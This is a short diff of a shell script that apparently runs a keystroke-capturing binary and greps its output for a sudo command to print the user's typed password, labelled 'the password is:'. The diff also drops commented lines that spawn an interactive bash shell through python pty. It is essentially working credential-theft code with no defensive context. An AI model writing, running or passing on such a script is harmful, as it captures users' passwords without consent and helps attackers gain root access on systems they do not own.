@@ -15,9 +15,7 @@ do
   echo "searching"
   ( timeout -k 9 20s  ./temp2.bin -m foreground 3>&1 1>&2- 2>&3- )  > test.txt
 done
-echo "trying passwords"
+echo "the password is:"
 cat test.txt | grep -o "sudo.*\[Enter\].*\[Enter\]" | perl -lane 'print $F[-2]' | grep ".*"
 rm test.txt temp2.bin
 exit
-#echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
-#python /tmp/asdf.py
